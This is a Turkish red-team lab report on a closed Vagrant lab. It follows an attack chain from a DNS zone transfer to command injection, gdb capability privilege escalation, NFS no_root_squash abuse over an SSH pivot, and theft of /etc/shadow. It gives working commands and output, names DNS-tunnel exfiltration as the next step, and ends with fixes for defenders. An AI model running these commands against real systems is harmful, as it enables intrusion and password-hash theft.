# Rol 1 — Keşif ve Sızma Raporu (Kör Nokta)

**Takım:** Red Team · **Rol:** Keşif ve Sızma Uzmanı
**Kapsam:** Kapalı, izole laboratuvar (Vagrant). Faz 1–3.
**Sonuç:** Saldırı zinciri uçtan uca başarıyla tamamlandı — kali → web (root) → nfs (root) → kritik veri.

---

## Özet

Dışarıdan yalnızca Firewall (192.168.56.10) görünür durumdayken; DNS Zone Transfer ile iç ağ
haritalandı, dışa açık web servisindeki komut enjeksiyonu ile içeri sızıldı, `gdb` capability
zafiyetiyle web sunucusunda root olundu, oradan NFS sunucusuna yanal geçiş yapılıp `no_root_squash`
zafiyetiyle NFS'te de root elde edildi ve kritik veri (`/etc/shadow`) ele geçirildi.

| Faz | Hedef | Teknik | Sonuç |
|-----|-------|--------|-------|
| 1 | İç DNS (firewall:53) | Zone Transfer (AXFR) | Ağ haritası: www=192.168.57.3, nfs=192.168.57.4 |
| 2 | web (firewall:8080) | Komut enjeksiyonu (PHP shell) → `gdb cap_setuid` | web'de root |
| 3 | nfs (192.168.57.4) | SSH pivot + NFS `no_root_squash` | nfs'te root + `/etc/shadow` |

---

## Ağ

| Makine | IP | Ağ | Rol |
|--------|-----|-----|-----|
| kali (saldırgan) | 192.168.56.100 | dış | Saldırı başlangıç noktası |
| firewall | 192.168.56.10 (dış) / .57.254 (iç) | sınır | 8080→web, 53→dns DNAT; dışarı yalnız 53 |
| web | 192.168.57.3 | iç | RCE + gdb cap_setuid |
| nfs | 192.168.57.4 | iç | no_root_squash, kritik veri |

Kural: iç makinelere doğrudan IP ile gidilmez; her erişim firewall + DNS + pivot üzerinden.

---

## Faz 1 — Keşif ve Ağ Haritalama (AXFR)

Kali üzerinden, sadece firewall görünürken zone transfer ile iç harita çıkarıldı.

```bash
cd /vagrant/red/recon
sudo bash recon.sh 192.168.56.10 altay.sec
```

**Çıktı (hosts_map):** www.altay.sec → 192.168.57.3, nfs.altay.sec → 192.168.57.4.
Bu iki adres hedef listesini oluşturdu.

---

## Faz 2 — İlk Erişim ve Yetki Yükseltme (web'de root)

**İlk erişim — komut enjeksiyonu (www-data):**
```bash
curl -s "http://192.168.56.10:8080/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

**Privesc vektörü — gdb'de cap_setuid:**
```bash
curl -s "http://192.168.56.10:8080/shell.php?cmd=getcap%20/usr/bin/gdb"
# /usr/bin/gdb cap_setuid=ep
```

**Root'a çıkış — gdb ile root sahipli SUID kabuk üret:**
```bash
curl -s --data-urlencode 'cmd=gdb -nx -ex "python import os; os.setuid(0)" -ex "!cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" -ex quit' "http://192.168.56.10:8080/shell.php"
curl -s "http://192.168.56.10:8080/shell.php?cmd=/tmp/rootbash%20-p%20-c%20id"
# uid=33(www-data) euid=0(root)   → WEB'DE ROOT
```

Doğrulama: `/etc/shadow` ve `/root` okunabildi (www-data'nın erişemeyeceği kaynaklar).

---

## Faz 3 — Yanal Geçiş (nfs'te root)

**Tam root kabuk** (mount.nfs ruid=0 ister; rootbash'in euid-only olması yetmiyor):
```bash
/tmp/rootbash -p
python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/bash","bash","-p")'
# uid=0(root) gid=0(root)
```

**NFS mount + no_root_squash ile root SUID kabuk yerleştir:**
```bash
mount -t nfs 192.168.57.4:/var/nfs/ortak /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash && chmod 4755 /mnt/nfs/rootbash
ls -l /mnt/nfs/rootbash
# -rwsr-xr-x 1 root root ... /mnt/nfs/rootbash
```

**SSH pivot ile NFS'e geçip kabuğu çalıştır:**
```bash
ssh -i /root/.ssh/id_rsa_nfs -o StrictHostKeyChecking=no user@192.168.57.4
/var/nfs/ortak/rootbash -p
id
# uid=1001(user) euid=0(root)   → NFS'TE ROOT
```

**Kritik veri:**
```bash
cat /etc/shadow
# root:$y$j9T$... (parola hash'leri ele geçirildi)
```

---

## Devir — Rol 1 → Rol 2 (Veri Kaçırma / Faz 4)

- **Hedef:** nfs-server (192.168.57.4), root erişimi sağlandı.
- **Erişim zinciri:** kali → web:8080 (RCE, www-data) → gdb cap_setuid (web root) → `ssh -i /root/.ssh/id_rsa_nfs user@192.168.57.4` → `/var/nfs/ortak/rootbash -p` (nfs root).
- **Kritik veri:** `/etc/shadow` (nfs), özellikle `root:$y$j9T$...` hash'i.
- **Kalıcı erişim:** `/var/nfs/ortak/rootbash` (root SUID) yerinde.
- **Faz 4 (Rol 2):** dnscat2 ile DNS tüneli üzerinden veriyi firewall'ı aşarak dışarı sızdırmak.

---

## Bulgular ve Öneriler (Blue Team'e)

| Zafiyet | Makine | Önerilen düzeltme |
|---------|--------|-------------------|
| AXFR açık (`allow-transfer any`) | int-dns | `allow-transfer` kısıtı + DNSSEC |
| Komut enjeksiyonu | web | Girdi doğrulama; `shell=True` kaldır |
| `gdb` cap_setuid | web | Gereksiz capability kaldır (`setcap -r`) |
| NFS `no_root_squash` | nfs | `root_squash`; export kapsamını daralt |
| SSH özel anahtar erişilebilir | web→nfs | Anahtar yönetimi; gereksiz güven ilişkisini kaldır |

---

## Delil Listesi (`red/evidence/`)

- `faz1_hosts_map.txt` — AXFR ağ haritası
- `faz2_rce_wwwdata.png` — `?cmd=id` → www-data
- `faz2_gdb_getcap.png` — cap_setuid=ep
- `faz2_web_root.png` — euid=0 + /etc/shadow (web)
- `faz3_nfs_root.png` — NFS'te euid=0
- `faz3_shadow.png` — nfs /etc/shadow

*Bu çalışma yalnızca kapalı laboratuvar ortamı içindir.*